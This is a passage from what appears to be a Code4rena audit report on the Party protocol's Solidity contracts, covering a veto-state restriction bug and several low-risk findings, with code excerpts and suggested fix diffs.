class=\"mtk12\">Voting</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalNotActiveError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>But when we look at the <code>PartyGovernance.veto</code> function which is called downstream and which implements the actual veto functionality (the <code>VetoProposal.voteToVeto</code> function is only a wrapper) we can see that it allows vetoing in the <code>Voting</code>, <code>Passed</code> and <code>Ready</code> states:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L617-L637\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">veto</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHost</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDelegateCall</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Setting `votes` to -1 indicates a veto.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">info</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_proposalStateByProposalId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ProposalStateValues</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">info</span><span class=\"mtk1\">.</span><span class=\"mtk12\">values</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\"> </span><span class=\"mtk12\">status</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getProposalStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">values</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Proposal must be in one of the following states.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">status</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Voting</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">status</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Passed</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">status</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Ready</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BadProposalStatusError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">status</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// -1 indicates veto.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">info</span><span class=\"mtk1\">.</span><span class=\"mtk12\">values</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">VETO_VALUE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalVetoed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Therefore we can see that the <code>VetoProposal.voteToVeto</code> function restricts the vetoing functionality too much.</p>\n<p>Users are not able to veto in the <code>Passed</code> and <code>Ready</code> states even though it should be possible.</p>\n<h3 id=\"tools-used-11\" style=\"position:relative;\"><a href=\"#tools-used-11\" aria-label=\"tools used 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The issue can be fixed by allowing the <code>VetoProposal.voteToVeto</code> function to be called in the <code>Passed</code> and <code>Ready</code> states as well.</p>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/proposals/VetoProposal.sol b/contracts/proposals/VetoProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 780826f..38410f6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/proposals/VetoProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/proposals/VetoProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -30,7 +30,11 @@ contract VetoProposal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             PartyGovernance.ProposalStatus proposalStatus,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             PartyGovernance.ProposalStateValues memory proposalValues</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ) = party.getProposalStateInfo(proposalId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (proposalStatus != PartyGovernance.ProposalStatus.Voting)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            proposalStatus != PartyGovernance.ProposalStatus.Voting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            &amp;&amp; proposalStatus != PartyGovernance.ProposalStatus.Passed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            &amp;&amp; proposalStatus != PartyGovernance.ProposalStatus.Ready</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert ProposalNotActiveError(proposalId);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/20#issuecomment-1515437523\">0xble (Party) confirmed and commented via duplicate issue <code>#20</code></a>:</strong></p>\n<blockquote>\n<p>This is valid, proposals should be allowed to be vetoed even after they’ve passed but have not yet been executed.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 3 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/14\">report highlighted below</a> by <strong>HollaDieWaldfee</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/47\">evan</a> and <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/43\">hansfriese</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th>Risk</th>\n<th>Title</th>\n<th>File</th>\n<th>Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>L-01</td>\n<td>ETH is not refunded when <code>allowArbCallsToSpendPatyETH=true</code></td>\n<td>ArbitraryCallsProposal.sol</td>\n<td>1</td>\n</tr>\n<tr>\n<td>L-02</td>\n<td>Comments state that pre-existing ETH can be used but it can’t</td>\n<td>-</td>\n<td>2</td>\n</tr>\n<tr>\n<td>L-03</td>\n<td>Issue due to rounding from previous C4 audit is still present in new crowdfund contracts</td>\n<td>-</td>\n<td>2</td>\n</tr>\n<tr>\n<td>L-04</td>\n<td>Use <code>delegationsByContributor[contributor]</code> instead of <code>delegate</code> when minting party card</td>\n<td>InitialETHCrowdfund.sol</td>\n<td>1</td>\n</tr>\n<tr>\n<td>L-05</td>\n<td>Attacker can decide how voting power is distributed across party cards (griefing attack)</td>\n<td>ReraiseETHCrowdfund.sol</td>\n<td>1</td>\n</tr>\n<tr>\n<td>L-06</td>\n<td>Use <code>uint256</code> for computations such that voting power can be all values in <code>uint96</code> range</td>\n<td>PartyGovernance.sol</td>\n<td>1</td>\n</tr>\n<tr>\n<td>L-07</td>\n<td>Allow specifying <code>maximumPrice</code> for individual NFTs</td>\n<td>CollectionBatchBuyOperator.sol</td>\n<td>1</td>\n</tr>\n<tr>\n<td>N-01</td>\n<td>Introduce separate <code>vetoThresholdBps</code> for vetoing a proposal</td>\n<td>VetoProposal.sol</td>\n<td>1</td>\n</tr>\n<tr>\n<td>N-02</td>\n<td><code>OperationExecuted</code> event is defined but never emitted</td>\n<td>OperatorProposal.sol</td>\n<td>1</td>\n</tr>\n<tr>\n<td>N-03</td>\n<td>Use <code>transferEth</code> instead of <code>transfer</code> for transferring ETH</td>\n<td>-</td>\n<td>4</td>\n</tr>\n<tr>\n<td>N-04</td>\n<td>Check that none of the <code>authorities</code> is zero address</td>\n<td>PartyFactory.sol</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"l-01-eth-is-not-refunded-when-allowarbcallstospendpatyethtrue\" style=\"position:relative;\"><a href=\"#l-01-eth-is-not-refunded-when-allowarbcallstospendpatyethtrue\" aria-label=\"l 01 eth is not refunded when allowarbcallstospendpatyethtrue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] ETH is not refunded when <code>allowArbCallsToSpendPatyETH=true</code></h2>\n<p>The <code>ArbitraryCallsProposal</code> contract does not refund <code>ETH</code> to the <code>msg.sender</code> if <code>allowArbCallsToSpendPartyEth=true</code>.  </p>\n<p>It only refunds when <code>allowArbCallsToSpendPartyEth=false</code>:  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/ArbitraryCallsProposal.sol#L108-L110\">Link</a>  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">allowArbCallsToSpendPartyEth</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">ethAvailable</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferEth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAvailable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The reason this is the case is that it is not expected that the <code>msg.sender</code> will provide <code>ETH</code> if it is allowed to spend <code>ETH</code> from the Party’s balance.  </p>\n<p>I don’t think this is a good assumption. There should be a refund mechanism.  </p>\n<p>Please also refer to my report <code>#5</code> which discusses a more severe similar issue. Some of the reasoning there also applies here. Specifically that there are two broad options to implement refunds when <code>allowArbCallsToSpendPartyEth=true</code>.  </p>\n<ol>\n<li>Use <code>msg.value</code> first</li>\n<li>Use Party balance first</li>\n</ol>\n<p>The sponsor needs to decide which policy (if any) to use.  </p>\n<h2 id=\"l-02-comments-state-that-pre-existing-eth-can-be-used-but-it-cant\" style=\"position:relative;\"><a href=\"#l-02-comments-state-that-pre-existing-eth-can-be-used-but-it-cant\" aria-label=\"l 02 comments state that pre existing eth can be used but it cant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Comments state that pre-existing ETH can be used but it can’t</h2>\n<p>It is possible to provide an initial contribution to the <code>ReraiseETHCrowdfund</code> and <code>InitialETHCrowdfund</code> contracts.  </p>\n<p>The initial contribution is processed when the <code>initialize</code> function is called.  </p>\n<p>In both contracts it is stated that pre-existing ETH is used for the initial contribution (i.e. ETH that is owned by the contract but not sent along with the call to the <code>initialize</code> function):  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L118-L131\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L118-L131</a>  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L80-L87\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L80-L87</a>  </p>\n<p>However the initial contribution is only measured by looking at <code>msg.value</code>:  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L120\">Link</a>  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialContribution</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastUint256ToUint96</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>This means that pre-existing ETH is not actually processed and just sits in the contract without being used for anything. It can’t even be rescued.  </p>\n<p>It was assessed with the sponsor that they don’t actually want to allow pre-existing ETH to be used for the initial contribution.  </p>\n<p>Therefore the comments should be removed so users don’t make a mistake and lose their ETH.  </p>\n<p>Fix:  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 8ab3b5c..bcc65e2 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -115,12 +115,9 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // If the deployer passed in some ETH during deployment, credit them</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // for the initial contribution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 initialContribution = msg.value.safeCastUint256ToUint96();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (initialContribution &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // If this contract has ETH, either passed in during deployment or</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // pre-existing, credit it to the `initialContributor`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // credit msg.value to the `initialContributor`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _contribute(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 crowdfundOpts.initialContributor,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 crowdfundOpts.initialDelegate,</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 580623d..6ad81fc 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -77,12 +77,9 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             0 // Ignored. Will use customization preset from party.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // If the deployer passed in some ETH during deployment, credit them</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // for the initial contribution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 initialContribution = msg.value.safeCastUint256ToUint96();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (initialContribution &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // If this contract has ETH, either passed in during deployment or</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // pre-existing, credit it to the `initialContributor`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // credit msg.value to the `initialContributor`.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _contribute(opts.initialContributor, opts.initialDelegate, initialContribution, &quot;&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<h2 id=\"l-03-issue-due-to-rounding-from-previous-c4-audit-is-still-present-in-new-crowdfund-contracts\" style=\"position:relative;\"><a href=\"#l-03-issue-due-to-rounding-from-previous-c4-audit-is-still-present-in-new-crowdfund-contracts\" aria-label=\"l 03 issue due to rounding from previous c4 audit is still present in new crowdfund contracts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Issue due to rounding from previous C4 audit is still present in new crowdfund contracts</h2>\n<p>In the previous C4 audit an issue has been found that due to rounding it might not be possible to achieve an unanimous vote:  </p>\n<p><a href=\"https://code4rena.com/reports/2022-09-party/#m-10-possible-that-unanimous-votes-is-unachievable\">https://code4rena.com/reports/2022-09-party/#m-10-possible-that-unanimous-votes-is-unachievable</a></p>\n<p>The issue also exists in the new crowdfund contracts (<code>InitialETHCrowdfund</code>, <code>ReraiseETHCrowdfund</code>).  </p>\n<p>I agree that it would be best to introduce the fix suggested by the warden in the old report.  </p>\n<p>However the sponsor told me that the <code>minContribution</code> amount will be set large enough such that the rounding issue cannot occur.  </p>\n<p>Therefore I don’t think this issue is worth reporting as Medium in this audit again. But I’d like to bring it up because it’s still present in the new contracts.  </p>\n<h2 id=\"l-04-use-delegationsbycontributorcontributor-instead-of-delegate-when-minting-party-card\" style=\"position:relative;\"><a href=\"#l-04-use-delegationsbycontributorcontributor-instead-of-delegate-when-minting-party-card\" aria-label=\"l 04 use delegationsbycontributorcontributor instead of delegate when minting party card permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Use <code>delegationsByContributor[contributor]</code> 